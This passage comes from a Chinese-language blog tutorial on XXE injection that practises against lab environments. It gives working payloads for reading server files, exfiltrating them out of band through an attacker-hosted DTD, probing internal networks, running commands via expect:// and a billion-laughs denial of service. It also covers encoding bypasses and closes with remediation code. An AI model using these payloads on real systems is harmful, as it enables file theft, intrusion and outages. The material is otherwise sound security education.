weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p></li></ul></li></ol><h2 id="DTD与实体"><a href="#DTD与实体" class="headerlink" title="DTD与实体"></a>DTD与实体</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>上面所示的就是一个DTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;外部dtd地址&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>上面所示的就是一个外部DTD</p><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><blockquote><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>文档元素可以使用&amp;来引用实体的值，<code>&amp;hello</code>将被替换为<code>hello world</code></p><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>XML参数实体是一种特殊的XML实体，只能在DTD中的其他地方引用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>可以看到参数实体用<code>% name</code>声明，引用时用<code>%name;</code></p><h4 id="引入外部实体"><a href="#引入外部实体" class="headerlink" title="引入外部实体"></a>引入外部实体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>这里使用了file协议来引入外部实体，实际上还能支持如下协议，这也是xxe漏洞形成的原因</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>XXE 漏洞发 生在<strong>应用程序解析 XML 输入时</strong>，没有禁止<strong>外部实体</strong>的加载，而外部实体的引用可支持http，file等协议，通过利用这些协议进行攻击。</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><ul><li><p>数据包中的content-type</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure></li><li><p>http body</p><p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p></li><li><p>数据包请求头中Context-Type的值为application&#x2F;json，更改为application&#x2F;xml或者text&#x2F;xml，然后插入payload测试</p></li></ul><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_import_dom</span>()</span><br></pre></td></tr></table></figure><p>需要注意的是PHP是使用libxml来解析XML的，但是<strong>libxml2.9.0</strong>开始就默认不解析外部实体，自然就不存在xxe漏洞。</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件读取</span><br><span class="line">内网探针</span><br><span class="line">拒绝服务攻击</span><br><span class="line">命令执行</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> php版本</li><li>vulhub Apache solr XML 实体注入漏洞（CVE-2017-12629）</li></ul><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>为回显位</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class="line">]&gt;                                                         </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h4><p>php:&#x2F;&#x2F;filter读取对方服务器文件内容→引入外部实体（攻击服务器上的）→触发外部实体中的写入代码，将读取到的文件内容赋值给指定参数→接收参数，在攻击服务器监听或者查看日志，从而获取到对方服务器文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--test.dtd--&gt;</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:8888/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>注意：test.dtd的内容，内部的%号要进行实体编码成&amp;#x25（因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>）</p></blockquote><p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><h5 id="引入服务器实体"><a href="#引入服务器实体" class="headerlink" title="引入服务器实体"></a>引入服务器实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--通过执行error实体，以便通过尝试加载不存在的文件来带出目标文件的值，从而生成包含不存在文件的名称的错误消息，该文件是/etc/passwd文件的内容--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p><h5 id="引入本地系统文件–测试失败"><a href="#引入本地系统文件–测试失败" class="headerlink" title="引入本地系统文件–测试失败"></a>引入本地系统文件–测试失败</h5><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>DTD code</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p><p>不是所有的xml解析器都能解析嵌套参数实体</p><p><img src="/../images/image-20230606151226408.png" alt="image-20230606151226408"></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- 使用php的filter过滤器读取含有xml保留字符的文件 --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p><p>当不能使用过滤器时</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POST数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;all是使用evil.dtd中的实体--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p><h4 id="列目录–JAVA"><a href="#列目录–JAVA" class="headerlink" title="列目录–JAVA"></a>列目录–JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607100242865.png" alt="image-20230607100242865"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;netdoc:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h4 id="内网探针"><a href="#内网探针" class="headerlink" title="内网探针"></a>内网探针</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://内网ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><blockquote><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://命令&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>phar协议反序列化</li><li><a href="https://xz.aliyun.com/t/3741">利用EXCEL进行XXE攻击</a></li><li>上传svg，docx等xml格式的文件进行攻击</li><li>java–jar协议解压压缩包</li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li><p>插入空格</p><p>可以在<code>&lt;?xml</code>或<code>&lt;!DOCTYPE</code>后插入任意数量的空格</p><p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p></li><li><p>编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16 BE，UTF-16 LE</span><br><span class="line">UTF-32 BE、UTF-32LE、UTF-322143、UTF-323412</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p></li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjector：一款功能强大的自动化XXE注射工具 - bmjoker - 博客园 (cnblogs.com)</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用外部实体</li></ul><p>PHP: </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure><p>JAVA: </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SAXBuilder</span></span><br><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DocumentBuilder</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>  DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">documentBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXReader</span></span><br><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXTransformerFactory</span></span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerFactory</span></span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();      </span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmarshaller 默认方法不存在xxe漏洞</span></span><br></pre></td></tr></table></figure><p> Python： </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ul><li>过滤用户提交的 XML 数据</li></ul><p>如过滤关键词：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a 